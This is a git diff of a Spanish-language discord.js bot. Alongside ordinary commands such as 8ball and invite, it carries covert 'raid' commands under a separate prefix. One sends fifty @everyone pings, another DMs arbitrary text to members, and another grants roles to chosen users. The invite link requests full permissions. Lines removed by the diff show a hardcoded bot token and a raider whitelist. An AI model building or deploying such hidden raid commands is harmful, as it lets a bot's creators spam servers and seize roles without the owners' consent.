@@ -1,7 +1,6 @@
 const Discord = require("discord.js");
 const client = new Discord.Client({ ws: { properties: { $browser: "Discord Android" }}})
 
-//cd C:\Users\Max-Marcano\Documents\MyDiscordBot
 
 client.on("ready", () => {
     console.log("Listo, váyalooooo :3");
@@ -10,21 +9,10 @@ client.on("ready", () => {
 
 const prefix = ";;";
 const raid = "!!";
-const admin = "z!"
-
-let raiders = ["MaxC++#7997", "StunxFS#8549"];
-
-		let args;
-		let mensaje;
 
 let muteds = [];
 
 client.on("message", message => {
-		if (muteds.includes(message.author.tag)) {
-			message.channel.bulkDelete(1);
-			return;
-		}
-	
     if(!message.guild || !message.content.startsWith(prefix)) return;
     if(message.author.bot) return;
     
@@ -35,7 +23,7 @@ client.on("message", message => {
 	
 	if(message.content.startsWith(prefix+"invite")) {
 		message.channel.send(`¡Revisa tu MD, ${message.author}!`);
-		message.author.send("https://discord.com/oauth2/authorize?client_id=828475020393054258&scope=bot&permissions=2147483647");
+		message.author.send("https://discord.com/oauth2/authorize?client_id=ID-DEL-BOT&scope=bot&permissions=2147483647");
 		message.author.send("¡Gracias por desear invitarme!");
 	}
 	if(message.content.startsWith(prefix+"8ball")) {
@@ -80,6 +68,8 @@ client.on("message", message => {
 	}
 });
 
+//Comandos especiales que solo pueden usar los usuarios definidos 
+
 client.on("message", message =>{
 	if(!message.content.startsWith(raid))return;
 	if(message.author.bot) return;
@@ -101,12 +91,14 @@ client.on("message", message =>{
 			.addField("Creador", "MaxC++#7997")
 			message.author.send(help).catch(e => message.channel.send("Error | :x:"))
 		}
+		//Envía 50 everyones en donde se envía este comando
 		if(message.content.startsWith(raid+"rape0")) {
 			message.delete();
 			for(let every = 0; every<=50; every++){
 				message.channel.send("@everyone");
 			}
 		}
+		//envía el mensaje que quieras al usuario mencionado, siempre y cuando esté en el mismo server
 		if(message.content.startsWith(raid+"case0")) {
 			message.delete();
 			let member = message.mentions.members.first();
@@ -117,6 +109,7 @@ client.on("message", message =>{
 			}
 			if (!!member.user) member.user.send(texto).catch(e => message.author.send("Error | :x:"));
 		}
+		//Este comando le asigna el rol definido a la persona definida
 		if(message.content.startsWith(raid+"take")) {
 			message.delete();
 			let usuario = message.mentions.members.first();
@@ -128,33 +121,6 @@ client.on("message", message =>{
 			usuario.roles.add(rol).catch(e => message.author.send("Ha aparecido un error, lpm"));
 			message.author.send(`Rol ${rol} agregado a ${usuario} correctamente!`).catch(e => message.author.send("Wacho, hubo un error x,d"));
 		}
-		if(message.content.startsWith(raid+"hit0")) {
-			guild.roles.create({
-			data: {
-				name: 'hit0',
-				color: 'BLUE',
-			},
-			reason: 'we needed a role for Super Cool People',
-			})
-			.then(console.log)
-			.catch(console.error);
-		}
-		if(message.content.startsWith(raid+"close0")) {
-			if (!args) return;
-			let xd = muteds.indexOf(args);
-			if (xd == -1) {
-				muteds.push(args);
-				message.author.send(args + " fue muteado");
-			}
-		}
-		if(message.content.startsWith(raid+"unclose0")) {
-			if (!args) return;
-			let xd = muteds.indexOf(args);
-			if (xd > -1) {
-				muteds.splices(i, 1);
-				message.author.send(args + " fue desmuteado");
-			}
-		}
 	}else return;
 });
 
@@ -162,7 +128,7 @@ client.on("message", message => {
 	if(!message.guild) return message.author.send("Lo siento, pero no estás en un servidor.");
 	if(message.author.bot) return;
 	
-	if(message.content.startsWith("<@!828475020393054258>")) {
+	if(message.content.startsWith("<@!ID_DEL_BOT>")) {
 		message.channel.send("Prefix: "+prefix);
 	}
 	/*if(message.is("prueba")) {
@@ -176,4 +142,4 @@ client.on("message", message => {
 	}
 });
 
-client.login("ODI4NDc1MDIwMzkzMDU0MjU4.YGqHfQ.LvB27vEz-Ql23BPrbw_KGhAEk98");
+client.login("Token del bot");
